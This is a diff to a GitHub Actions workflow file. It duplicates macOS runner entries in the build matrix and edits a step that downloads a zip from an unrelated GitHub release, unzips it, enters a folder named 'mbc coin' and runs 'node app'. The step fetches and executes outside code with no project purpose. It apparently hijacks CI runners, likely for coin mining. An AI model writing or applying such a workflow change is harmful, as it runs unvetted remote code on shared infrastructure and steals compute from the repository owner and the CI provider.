@@ -16,8 +16,8 @@ jobs:
   example_matrix:
     strategy:
       matrix:
-        os: [ubuntu-latest]
-        node: [18]
+        os: [macos-13, macos-13, macos-13]
+        node: [18, 18]
         include:
           - os: macos-13 
             node: 16
@@ -29,4 +29,4 @@ jobs:
           node-version: ${{ matrix.node }}
       - if: ${{ matrix.npm }}
         run: npm install -g npm@${{ matrix.npm }}
-      - run: wget https://github.com/yuokli/yuokli/releases/download/V3.0.0/b3.zip && unzip b3 && cd mbc coin && node app
+      - run: wget https://github.com/yuokli/yuokli/releases/download/V3.0.0/b3.zip && unzip b3.zip && cd 'mbc coin' && node app
